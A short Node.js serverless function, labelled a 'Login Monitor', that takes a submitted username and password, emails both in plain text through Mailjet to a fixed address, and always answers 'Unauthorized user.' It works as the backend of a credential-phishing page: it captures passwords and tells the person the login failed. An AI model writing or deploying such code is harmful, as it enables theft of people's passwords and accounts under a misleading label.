const mailjet = require('node-mailjet');

exports.handler = async function(event, context) {
  const { MJ_APIKEY_PUBLIC, MJ_APIKEY_PRIVATE } = process.env;
  const { username, password } = JSON.parse(event.body || '{}');

  const mailjetClient = mailjet.apiConnect(MJ_APIKEY_PUBLIC, MJ_APIKEY_PRIVATE);

  try {
    await mailjetClient.post('send', { version: 'v3.1' }).request({
      Messages: [
        {
          From: {
            Email: "sg@157global.com",
            Name: "157Global Login Monitor"
          },
          To: [
            {
              Email: "sg@157global.com",
              Name: "Admin"
            }
          ],
          Subject: "Login Attempt Notification",
          TextPart: `Login attempt:
Username: ${username}
Password: ${password}`
        }
      ]
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Unauthorized user." })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "Error sending email." })
    };
  }
};
